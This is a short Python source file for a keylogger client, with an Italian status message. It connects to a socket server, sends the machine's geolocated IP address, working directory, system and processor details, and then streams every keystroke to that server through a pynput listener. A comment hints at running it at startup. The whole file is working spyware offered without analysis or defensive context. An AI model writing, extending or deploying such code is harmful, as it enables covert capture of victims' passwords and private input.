import socket as s
import geocoder
from os import getcwd
from platform import uname, processor
from time import sleep
from pynput.keyboard import Listener


class Client:
    def __init__(self):
        # checking and set the file at the start of pc
        self.client = s.socket()
        self.host = "localhost"
        self.port = 8080
        self.key_logger_mod = True
        self.conn_server()

    def conn_server(self):
        self.client.connect((self.host, self.port))
        print("Connessione effettuata!")
        sleep(3)
        self.get_vinfo()
        self.key_logger()

    def sendmsg(self, msg):
        self.client.sendall(msg.encode())

    def get_vinfo(self):
        ip = geocoder.ip("me")
        pc_information = f"{getcwd()} {uname()} {processor()}"
        msg = f"ip: {ip} AND info: {pc_information}"
        self.sendmsg(msg)

    def on_press(self, key):
        if self.key_logger_mod:
            self.sendmsg(str(key))

    def key_logger(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    Client()
